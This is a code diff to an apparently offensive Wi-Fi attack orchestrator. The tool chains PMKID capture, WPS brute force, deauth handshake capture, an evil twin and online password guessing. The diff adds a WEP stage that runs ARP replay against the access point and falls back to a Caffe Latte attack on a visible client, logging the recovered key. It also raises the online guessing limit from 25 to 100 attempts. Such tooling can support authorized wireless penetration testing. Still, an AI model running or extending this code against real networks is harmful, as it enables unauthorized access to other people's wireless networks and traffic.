@@ -6,8 +6,11 @@ the first one that yields crackable material, then cracks it.
 Chain: PROFILE -> PMKID -> WPS -> HANDSHAKE -> EVILTWIN -> ONLINE ->
 CRACK -> DONE. ONLINE is a live per-password 4-way-handshake attempt
 against the AP itself (attacks/online.py) -- WPA/WPA2/transition
-(PSK AKM) only, skipped for WPA3-only/SAE and WEP targets, and only
-run once a wordlist is configured (nothing to guess otherwise).
+(PSK AKM) only, skipped for WPA3-only/SAE targets, and only run once
+a wordlist is configured (nothing to guess otherwise). WEP targets
+skip this whole WPA-oriented chain entirely: PROFILE -> WEP -> DONE,
+where WEP tries AP-directed ARP replay then falls back to Caffe Latte
+against a visible client (see _stage_wep).
 
 Single-adapter by design. Dual-Alfa split listen/attack (PINCER) is a
 separate, real, tested implementation (gui/attack_runner.py's pincer()),
@@ -33,6 +36,8 @@ from .attacks.handshake import capture_handshake as _default_capture_handshake
 from .attacks.logic import best_status, run_deauth_flow, select_client
 from .attacks.online import online_guess as _default_online_guess
 from .attacks.pmkid import capture_pmkid as _default_capture_pmkid
+from .attacks.wep_client import caffe_latte as _default_caffe_latte
+from .attacks.wep_crack import crack_wep as _default_crack_wep
 from .attacks.wps import pixie_attempt as _default_pixie_attempt
 from .attacks.wps import wps_pin_bruteforce as _default_wps_bruteforce
 from .crack.base import Cracker
@@ -97,13 +102,16 @@ class OmniOrchestrator:
         pixie_fn=_default_pixie_attempt,
         eviltwin_fn=_default_eviltwin,
         online_fn=_default_online_guess,
+        crack_wep_fn=_default_crack_wep,
+        caffe_latte_fn=_default_caffe_latte,
         iface_ap: str | None = None,
         stop_event: threading.Event | None = None,
         handshake_max_rounds: int | None = None,
         handshake_round_interval: float | None = None,
         handshake_burst_size: int | None = None,
         listener_settle: float = 2.0,
-        online_max_attempts: int | None = 25,
+        online_max_attempts: int | None = 100,
+        wep_key_len: int = 13,
         progress_fn=None,
         proc_holder: dict | None = None,
     ):
@@ -126,6 +134,9 @@ class OmniOrchestrator:
         self._pixie_fn = pixie_fn
         self._eviltwin_fn = eviltwin_fn
         self._online_fn = online_fn
+        self._crack_wep_fn = crack_wep_fn
+        self._caffe_latte_fn = caffe_latte_fn
+        self.wep_key_len = wep_key_len
         self._iface_ap = iface_ap
         self._stop = stop_event or threading.Event()
         self.handshake_max_rounds = handshake_max_rounds or self.HANDSHAKE_MAX_ROUNDS
@@ -158,6 +169,11 @@ class OmniOrchestrator:
             report.stages.append(
                 StageReport("pmkid", StageResult.SKIPPED, "open network — nothing to crack")
             )
+            return report
+
+        if ap.security == "WEP":
+            self._log("stage: WEP")
+            self._stage_wep(ap, report)
             return report
 
         self._log("stage: PMKID")
@@ -206,6 +222,11 @@ class OmniOrchestrator:
             report.stages.append(
                 StageReport("pmkid", StageResult.SKIPPED, "open network — nothing to crack")
             )
+            return report
+
+        if ap.security == "WEP":
+            self._log("stage: WEP")
+            self._stage_wep(ap, report)
             return report
 
         self._log("stage: PMKID")
@@ -314,6 +335,68 @@ class OmniOrchestrator:
             )
             return True
         report.stages.append(StageReport("wps", StageResult.FAILED, f"exhausted after {result.attempts} attempts"))
+        return False
+
+    def _stage_wep(self, ap: AccessPoint, report: OmniReport) -> bool:
+        """WEP recovery: AP-directed ARP replay first (crack_wep -- fake-auth
+        to the AP, wait for/replay an ARP seed). If the AP never produces a
+        seed frame at all but a client is visible in the scan, that client
+        is transmitting its own WEP traffic directly -- Caffe Latte
+        (wep_client.caffe_latte) replays a captured client ARP back at the
+        CLIENT instead, needing no AP association, so it can still recover
+        the key when the AP side stays silent. Skipped (not retried via
+        Caffe Latte) when a seed WAS found but there weren't enough
+        sessions to crack -- that's a "keep waiting longer" problem, not
+        one Caffe Latte's different capture path would fix."""
+        if self._stop.is_set():
+            report.stages.append(StageReport("wep", StageResult.SKIPPED, "stopped"))
+            return False
+
+        try:
+            client = get_mac(self.iface)
+        except Exception as exc:  # noqa: BLE001 - radio lookup failure shouldn't crash the chain
+            report.stages.append(StageReport("wep", StageResult.FAILED, str(exc)))
+            return False
+
+        self._log(f"WEP: ARP replay against {ap.bssid}")
+        result_out: dict = {}
+        key = self._crack_wep_fn(
+            self.iface, ap.bssid, client, ap.ssid or "", key_len=self.wep_key_len,
+            channel=ap.channel, stop_event=self._stop, progress_fn=self._log, result_out=result_out,
+        )
+        if key is not None:
+            report.cracked[ap.bssid] = key.hex()
+            report.stages.append(StageReport("wep", StageResult.SUCCESS, f"ARP replay -> key={key.hex()}"))
+            return True
+
+        if result_out.get("seed_found"):
+            report.stages.append(StageReport("wep", StageResult.FAILED, "ARP seed found but not enough sessions to recover the key"))
+            return False
+
+        if not ap.clients:
+            report.stages.append(
+                StageReport("wep", StageResult.FAILED, "no ARP seed via AP replay, and no client seen to try Caffe Latte against")
+            )
+            return False
+
+        if self._stop.is_set():
+            report.stages.append(StageReport("wep", StageResult.SKIPPED, "stopped before Caffe Latte"))
+            return False
+
+        target_client = next(iter(ap.clients))
+        self._log(f"WEP: no ARP seed via AP replay, client {target_client} visible — trying Caffe Latte")
+        key = self._caffe_latte_fn(
+            self.iface, target_client, key_len=self.wep_key_len,
+            channel=ap.channel, stop_event=self._stop, progress_fn=self._log,
+        )
+        if key is not None:
+            report.cracked[ap.bssid] = key.hex()
+            report.stages.append(
+                StageReport("wep", StageResult.SUCCESS, f"Caffe Latte vs {target_client} -> key={key.hex()}")
+            )
+            return True
+
+        report.stages.append(StageReport("wep", StageResult.FAILED, "Caffe Latte found no key"))
         return False
 
     def _stage_handshake(self, ap: AccessPoint, report: OmniReport) -> HandshakeStatus:
